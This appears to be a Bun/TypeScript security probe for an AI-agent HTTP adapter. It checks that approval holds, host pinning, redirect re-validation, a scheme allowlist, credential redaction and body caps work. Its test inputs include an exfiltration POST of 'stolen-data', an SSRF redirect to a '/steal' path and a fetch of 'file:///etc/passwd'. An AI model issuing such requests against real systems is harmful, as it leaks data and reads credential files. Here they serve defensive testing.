#!/usr/bin/env bun
/**
 * Probe: http_adapter_enforces_egress_invariants
 *
 * Locks the transport-governance invariants of the native HTTP tools
 * (`@qmilab/lodestar-adapter-http`: `http.fetch` / `http.request`) by driving the
 * REAL adapter tools through the REAL Action Kernel
 * (propose → arbitrate → resolve → execute) against in-process fake HTTP servers
 * standing in for the network. `http.request` is the third native egress after
 * `git.push` and `nostr.publish`, and `http` is the first adapter that hits all
 * three governance surfaces at once (injection vector + egress + untrusted
 * content), so these are the things that MUST hold:
 *
 *   1. **L4 hold blocks the world.** An `http.request` (egress) proposed at L4
 *      parks at `pending_approval`, and the request does NOT reach the server
 *      while it waits. Only after `resolve(granted)` + `execute` does it land with
 *      its body. (Two-phase discipline on the egress action.)
 *   2. **Host pinning beats exfiltration.** An approved `http.request` to a
 *      NON-pinned host (`localhost`, the un-pinned alias of the same loopback
 *      server) ends `failed`, and the decoy receives nothing.
 *   3. **Redirect re-validation.** A fetch of a pinned host that 3xx-redirects to
 *      a NON-pinned host (`localhost` — the canonical SSRF escalation) ends
 *      `failed`; the redirect is not followed and the decoy receives nothing. A
 *      redirect to a still-pinned host IS followed (the guard isn't a blanket
 *      no-redirect).
 *   4. **Scheme allowlist.** A fetch of a `file://` URL ends `failed` — the agent
 *      cannot make the adapter read a local file off the loopback allowlist.
 *   5. **Credentials never leak.** The operator credential is injected on the
 *      request (the server sees it) but is absent from the recorded action inputs
 *      AND the emitted observation (redacted), and the agent never supplied it.
 *   6. **Bounded capture.** An oversized response body is captured up to the cap
 *      and flagged `body_truncated` — an untrusted server cannot inflate an
 *      observation without bound.
 *
 * If any of these regress, a Lodestar-wrapped agent could POST to an attacker
 * host, follow a redirect into the internal network, read local files, leak an
 * API token, or buffer an unbounded hostile body — so this probe is spec, not
 * test scaffolding.
 */

import {
  ActionKernel,
  type PolicyGate,
  type PreconditionChecker,
  _resetToolsForTests,
} from "@qmilab/lodestar-action-kernel"
import { registerHttpTools } from "@qmilab/lodestar-adapter-http"
import type { ActionContract, BlastRadius, Observation, Reversibility } from "@qmilab/lodestar-core"

interface ProbeResult {
  passed: boolean
  details: string
}

// A distinctive operator credential. It is injected by the adapter at request
// time; it must NEVER surface in inputs or observations.
const CREDENTIAL_SENTINEL = "tok_live_PROBEsecret_deadbeefcafef00d"

// -----------------------------------------------------------------------------
// In-process fake HTTP server (Bun.serve) that records what it received.
// Bound to 127.0.0.1 (the pinned address); `localhostUrl` is the SAME server
// addressed via the hostname `localhost`, which is deliberately NOT pinned — the
// portable stand-in for an internal/attacker host (loopback alias on every OS).
// -----------------------------------------------------------------------------

interface FakeServer {
  url: string
  localhostUrl: string
  count: () => number
  lastAuth: () => string | null
  lastBody: () => string | null
  stop: () => void
}

type Responder = (req: Request) => Response

function startServer(respond: Responder): FakeServer {
  const rec = { count: 0, auths: [] as (string | null)[], bodies: [] as (string | null)[] }
  const server = Bun.serve({
    hostname: "127.0.0.1",
    port: 0,
    async fetch(req) {
      rec.count += 1
      rec.auths.push(req.headers.get("authorization"))
      rec.bodies.push(req.method === "GET" || req.method === "HEAD" ? null : await req.text())
      return respond(req)
    },
  })
  const port = server.port
  return {
    url: `http://127.0.0.1:${port}`,
    localhostUrl: `http://localhost:${port}`,
    count: () => rec.count,
    lastAuth: () => rec.auths.at(-1) ?? null,
    lastBody: () => rec.bodies.at(-1) ?? null,
    stop: () => server.stop(true),
  }
}

function contractFor(level: number, blast: BlastRadius, rev: Reversibility): ActionContract {
  return {
    required_level: level,
    blast_radius: blast,
    reversibility: rev,
    scope: { level: "project", identifier: "probe-http" },
    data_sensitivity: "private",
    preconditions: [],
  }
}

async function run(): Promise<ProbeResult> {
  _resetToolsForTests()

  // The pinned destination: echoes the Authorization header it saw, records bodies.
  const target = startServer(
    (req) => new Response(`seen-auth:${req.headers.get("authorization")}`, { status: 200 }),
  )
  // A redirector on the pinned host; its Location is set per sub-case.
  let redirectLocation = ""
  const redirector = startServer(
    () => new Response(null, { status: 302, headers: { location: redirectLocation } }),
  )
  // The non-pinned exfil/SSRF target (reached only via its `localhostUrl`).
  const decoy = startServer(() => new Response("decoy-should-never-be-hit"))
  // An oversized-body server for the bounded-capture check.
  const big = startServer(() => new Response("X".repeat(50_000)))

  const observations: Observation[] = []
  const observationSink = async (obs: Observation): Promise<void> => {
    observations.push(obs)
  }
  // Three-valued gate: L4+ holds for human approval; below auto-approves.
  const policyGate: PolicyGate = async (action) => {
    if (action.contract.required_level >= 4) {
      return {
        approved: false,
        requires_human_approval: true,
        reason: "L4 egress requires human approval",
        approver_id: "probe.policy",
      }
    }
    return { approved: true, reason: "below L4 auto-approved", approver_id: "probe.policy" }
  }
  const preconditionChecker: PreconditionChecker = async () => ({ holds: true, observed: null })

  try {
    registerHttpTools({
      fetch: {
        allowedHosts: ["127.0.0.1"],
        allowHttp: true,
        credentials: [{ host: "127.0.0.1", header: "Authorization", value: CREDENTIAL_SENTINEL }],
        // A small cap so the 50 KiB body truncates while the tiny echoes do not.
        maxBytes: 4096,
      },
      request: {
        allowedHosts: ["127.0.0.1"],
        allowHttp: true,
      },
    })

    const kernel = new ActionKernel(policyGate, preconditionChecker, observationSink, {
      useStubsForTests: true,
    })
    const propose = (tool: string, inputs: unknown, contract: ActionContract) =>
      kernel.propose({ intent: `probe ${tool}`, tool, inputs, contract, proposed_by: "probe.http" })
    const grant = (action: { id: string }, reqId: string) => ({
      kind: "granted" as const,
      action_id: action.id,
      request_id: reqId,
      approver_id: "probe.human",
    })

    // ---- 1. L4 hold blocks the world --------------------------------------
    const egressHeld = await kernel.arbitrate(
      propose(
        "http.request",
        { url: `${target.url}/submit`, method: "POST", body: "payload-001" },
        contractFor(4, "external", "irreversible"),
      ),
    )
    if (egressHeld.phase !== "pending_approval") {
      return {
        passed: false,
        details: `L4 hold FAILED: an http.request proposed at L4 did not park at pending_approval (phase=${egressHeld.phase}).`,
      }
    }
    if (target.count() !== 0) {
      return {
        passed: false,
        details:
          "L4 hold FAILED: the request reached the server while only at pending_approval — a held egress action touched the world.",
      }
    }
    const egressDone = await kernel.execute(
      kernel.resolve(egressHeld, grant(egressHeld, "req-egr")),
    )
    if (egressDone.phase !== "completed") {
      return {
        passed: false,
        details: `egress FAILED: the approved http.request did not complete (phase=${egressDone.phase}); audit: ${JSON.stringify(egressDone.audit.at(-1))}`,
      }
    }
    if (target.count() !== 1 || target.lastBody() !== "payload-001") {
      return {
        passed: false,
        details: `egress FAILED: the approved request did not deliver its body exactly once (count=${target.count()}, body=${target.lastBody()}).`,
      }
    }

    // ---- 2. Host pinning beats exfiltration -------------------------------
    const exfilHeld = await kernel.arbitrate(
      propose(
        "http.request",
        { url: `${decoy.localhostUrl}/exfil`, method: "POST", body: "stolen-data" },
        contractFor(4, "external", "irreversible"),
      ),
    )
    const exfilDone = await kernel.execute(kernel.resolve(exfilHeld, grant(exfilHeld, "req-exf")))
    if (exfilDone.phase !== "failed") {
      return {
        passed: false,
        details: `host pinning FAILED: an approved http.request to a non-pinned host (localhost) did not end 'failed' (phase=${exfilDone.phase}).`,
      }
    }
    if (decoy.count() !== 0) {
      return {
        passed: false,
        details: "host pinning FAILED: the non-pinned decoy received a request.",
      }
    }

    // ---- 3. Redirect re-validation ----------------------------------------
    // 3a: a pinned host that redirects to localhost is NOT followed.
    redirectLocation = `${decoy.localhostUrl}/steal`
    const ssrfDone = await kernel.execute(
      await kernel.arbitrate(
        propose(
          "http.fetch",
          { url: `${redirector.url}/go` },
          contractFor(1, "project", "reversible"),
        ),
      ),
    )
    if (ssrfDone.phase !== "failed") {
      return {
        passed: false,
        details: `redirect SSRF FAILED: a fetch redirected to a non-pinned host (localhost) did not end 'failed' (phase=${ssrfDone.phase}).`,
      }
    }
    if (decoy.count() !== 0) {
      return {
        passed: false,
        details: "redirect SSRF FAILED: a redirect to the non-pinned decoy was followed.",
      }
    }
    // 3b: a redirect to a still-pinned host IS followed (not a blanket block).
    redirectLocation = `${target.url}/landed`
    const followDone = await kernel.execute(
      await kernel.arbitrate(
        propose(
          "http.fetch",
          { url: `${redirector.url}/go2` },
          contractFor(1, "project", "reversible"),
        ),
      ),
    )
    const followObs = observations.find((o) => o.source.invocation_id === followDone.id)
    const followOut = followObs?.payload as { redirected?: boolean; status?: number } | undefined
    if (followDone.phase !== "completed" || followOut?.redirected !== true) {
      return {
        passed: false,
        details: `redirect follow FAILED: a fetch redirected to a still-pinned host did not complete-with-redirect (phase=${followDone.phase}, out=${JSON.stringify(followOut)}).`,
      }
    }

    // ---- 4. Scheme allowlist (no file:// ) --------------------------------
    const fileDone = await kernel.execute(
      await kernel.arbitrate(
        propose(
          "http.fetch",
          { url: "file:///etc/passwd" },
          contractFor(1, "project", "reversible"),
        ),
      ),
    )
    if (fileDone.phase !== "failed") {
      return {
        passed: false,
        details: `scheme allowlist FAILED: a fetch of a file:// URL did not end 'failed' (phase=${fileDone.phase}).`,
      }
    }

    // ---- 5. Credentials never leak ----------------------------------------
    const credDone = await kernel.execute(
      await kernel.arbitrate(
        propose(
          "http.fetch",
          { url: `${target.url}/whoami` },
          contractFor(1, "project", "reversible"),
        ),
      ),
    )
    if (credDone.phase !== "completed") {
      return {
        passed: false,
        details: `credential check FAILED: the fetch did not complete (phase=${credDone.phase}).`,
      }
    }
    if (target.lastAuth() !== CREDENTIAL_SENTINEL) {
      return {
        passed: false,
        details: `credential check FAILED: the operator credential was not injected on the request (server saw '${target.lastAuth()}').`,
      }
    }
    const credObs = observations.find((o) => o.source.invocation_id === credDone.id)
    if (!credObs) {
      return { passed: false, details: "credential check FAILED: no observation recorded." }
    }
    if (JSON.stringify(credObs).includes(CREDENTIAL_SENTINEL)) {
      return {
        passed: false,
        details:
          "credential leak FAILED: the credential surfaced in the observation (echoed body not redacted).",
      }
    }
    if (JSON.stringify(credDone.inputs).includes(CREDENTIAL_SENTINEL)) {
      return {
        passed: false,
        details: "credential leak FAILED: the credential surfaced in the recorded action inputs.",
      }
    }

    // ---- 6. Bounded capture -----------------------------------------------
    const bigDone = await kernel.execute(
      await kernel.arbitrate(
        propose("http.fetch", { url: `${big.url}/big` }, contractFor(1, "project", "reversible")),
      ),
    )
    const bigObs = observations.find((o) => o.source.invocation_id === bigDone.id)
    const bigOut = bigObs?.payload as { body_truncated?: boolean; body_bytes?: number } | undefined
    if (bigDone.phase !== "completed" || bigOut?.body_truncated !== true) {
      return {
        passed: false,
        details: `bounded capture FAILED: a 50 KiB body was not truncated at the cap (phase=${bigDone.phase}, out=${JSON.stringify(bigOut)}).`,
      }
    }
    if ((bigOut.body_bytes ?? Number.MAX_SAFE_INTEGER) > 4096) {
      return {
        passed: false,
        details: `bounded capture FAILED: captured ${bigOut.body_bytes} bytes, above the 4096 cap.`,
      }
    }

    return {
      passed: true,
      details:
        "Native HTTP transport held every invariant through the Action Kernel: an http.request proposed at L4 parked at pending_approval and reached no server until approval, then delivered its body exactly once; an approved request to a non-pinned host (localhost) ended 'failed' and the decoy got nothing; a fetch redirected to localhost ended 'failed' and the decoy got nothing, while a redirect to a still-pinned host was followed; a file:// fetch ended 'failed' (scheme allowlist); the operator credential reached the server but never surfaced in the inputs or the observation; and a 50 KiB body was captured up to the 4 KiB cap and flagged truncated.",
    }
  } finally {
    for (const s of [target, redirector, decoy, big]) s.stop()
  }
}

const result = await run()
console.log("─".repeat(72))
console.log("probe: http_adapter_enforces_egress_invariants")
console.log("─".repeat(72))
console.log(`status: ${result.passed ? "PASS ✓" : "FAIL ✗"}`)
console.log(result.details)
console.log("─".repeat(72))

if (!result.passed) process.exit(1)
